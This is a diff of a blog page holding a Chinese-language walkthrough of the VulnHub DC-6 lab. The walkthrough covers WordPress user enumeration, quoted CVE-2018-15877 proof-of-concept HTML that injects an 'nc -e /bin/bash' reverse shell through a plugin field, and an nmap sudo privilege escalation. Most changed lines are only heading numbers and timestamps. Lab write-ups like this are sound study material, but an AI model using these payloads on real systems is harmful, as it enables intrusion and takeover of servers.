@@ -37,7 +37,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513165503.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513170200.png">
 <meta property="article:published_time" content="2022-05-12T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-13T09:06:19.546Z">
+<meta property="article:modified_time" content="2022-05-14T06:56:09.351Z">
 <meta property="article:author" content="hdfzzf">
 <meta property="article:tag" content="综合">
 <meta property="article:tag" content="vulnhub">
@@ -162,7 +162,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="nav-text">主机发现、端口扫描、端口服务发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-shell"><span class="nav-text">get shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-text">1. 靶机信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-text">2. 渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="nav-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">2.2. 信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-shell"><span class="nav-text">2.3. get shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">2.4. 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">3. 总结</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -177,18 +177,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">93</span>
+          <span class="site-state-item-count">97</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">158</span>
+        <span class="site-state-item-count">163</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -259,9 +259,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2022-05-13 00:00 / 修改时间：17:06" itemprop="dateCreated datePublished" datetime="2022-05-13T00:00:00+08:00">2022-05-13</time>
+      <time title="创建时间：2022-05-13 00:00" itemprop="dateCreated datePublished" datetime="2022-05-13T00:00:00+08:00">2022-05-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-05-14 14:56" itemprop="dateModified" datetime="2022-05-14T14:56:09+08:00">2022-05-14</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -321,7 +327,7 @@
     <div class="post-body" itemprop="articleBody">
         <p>该靶机难度适中。</p>
 <span id="more"></span>
-<h1 id="靶机信息">靶机信息</h1>
+<h1 id="靶机信息">1. 靶机信息</h1>
 <p>靶机地址：</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-6,315/">DC: 6 ~ VulnHub</a></li>
@@ -339,11 +345,11 @@
 <ul>
 <li><code>cat rockyou.txt | grep k01 &gt; passwords.txt</code></li>
 </ul>
-<h1 id="渗透">渗透</h1>
-<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
+<h1 id="渗透">2. 渗透</h1>
+<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.41</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.41</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513141147.png" /></p>
-<h2 id="信息收集">信息收集</h2>
+<h2 id="信息收集">2.2. 信息收集</h2>
 <p>根据扫描结果，需要将wordy加入/etc/hosts然后直接访问，主页面除了知道CMS是wordpress之外，没有任何信息。</p>
 <p>解析来进行路径扫描，得到一个后台登录界面 /wp-admin，除此之外，没有任何收获。解析来枚举以下用户信息： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ --enumerate u </span><br></pre></td></tr></table></figure></p>
 <p>得到如下用户信息： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">sarah</span><br><span class="line">graham</span><br><span class="line">mark</span><br><span class="line">jens</span><br></pre></td></tr></table></figure></p>
@@ -353,14 +359,14 @@
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513163453.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513163517.png" /></p>
 <p>存在 RCE 漏洞。但是这里不要使用给的py文件，虽然可以直接get shell，但是后续操作的命令中一旦含有空格就会自动断开。</p>
-<h2 id="get-shell">get shell</h2>
+<h2 id="get-shell">2.3. get shell</h2>
 <p>查看 45274.html，看一下利用方式 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PoC:</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="line">        [+] Version: 20161228 and possibly prior</span><br><span class="line">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="line">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="line">        [+] CVE-ID: CVE-2018-15877</span><br><span class="line">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="line">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;ip&quot; value=&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;lookup&quot; value=&quot;Lookup&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;  </span><br></pre></td></tr></table></figure></p>
 <p>阅读之后，发现漏洞其实是在下图红框中</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513163731.png" /></p>
 <p>但是，这里被限制了输入长度，因此先随便输入之后，点击 Lookup 并抓包，然后通过修改数据包来get shell</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513164652.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513164746.png" /></p>
-<h2 id="权限提升">权限提升</h2>
+<h2 id="权限提升">2.4. 权限提升</h2>
 <p>首先查看了 /etc/passwd，除了root之外还有四个用户：graham,mark,jens,sarah。</p>
 <p>一一查看家目录，当查看到 mark 的时候，有一个stuff目录，里面有一个文件 things-to-do.txt，内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Things to do:</span><br><span class="line"></span><br><span class="line">- Restore full functionality for the hyperdrive (need to speak to Jens)</span><br><span class="line">- Buy present for Sarah&#x27;s farewell party</span><br><span class="line">- Add new user: graham - GSo7isUM1D4 - done</span><br><span class="line">- Apply for the OSCP course</span><br><span class="line">- Buy new laptop for Sarah&#x27;s replacement</span><br></pre></td></tr></table></figure></p>
 <p>注意到，graham - GSo7isUM1D4 ，后面的字符串可能是密码，尝试切换用户。</p>
@@ -377,7 +383,7 @@
 <p>根据<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nmap/">nmap | GTFOBins</a>指出，可以依次执行下面命令进行提权： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. TF=$(mktemp) # 创建临时文件</span><br><span class="line">2. echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF</span><br><span class="line">3. sudo /usr/bin/nmap --script=$TF</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513170200.png" /></p>
 <p>最后，读取/root/theflag.txt <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b </span><br><span class="line"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure></p>
-<h1 id="总结">总结</h1>
+<h1 id="总结">3. 总结</h1>
 <p>该靶机难度适中，除了密码爆破之外，虽然说没有提示也能爆破出来，但是估计要大半天。。。</p>
 <p>涉及到的攻击方法：</p>
 <ol type="1">
@@ -405,13 +411,13 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/05/13/DC-7%20Writeup/" rel="prev" title="DC-7 Writeup">
-                  <i class="fa fa-chevron-left"></i> DC-7 Writeup
+                <a href="/2022/05/13/DC-5%20Writeup/" rel="prev" title="DC-5 Writeup">
+                  <i class="fa fa-chevron-left"></i> DC-5 Writeup
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2022/05/13/DC-5%20Writeup/" rel="next" title="DC-5 Writeup">
-                  DC-5 Writeup <i class="fa fa-chevron-right"></i>
+                <a href="/2022/05/14/Port%20Knocking/" rel="next" title="Port Knocking">
+                  Port Knocking <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
@@ -450,14 +456,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">359k</span>
+    <span title="站点总字数">369k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">5:26</span>
+    <span title="站点阅读时长">5:36</span>
   </span>
 </div>
 <div class="busuanzi-count">
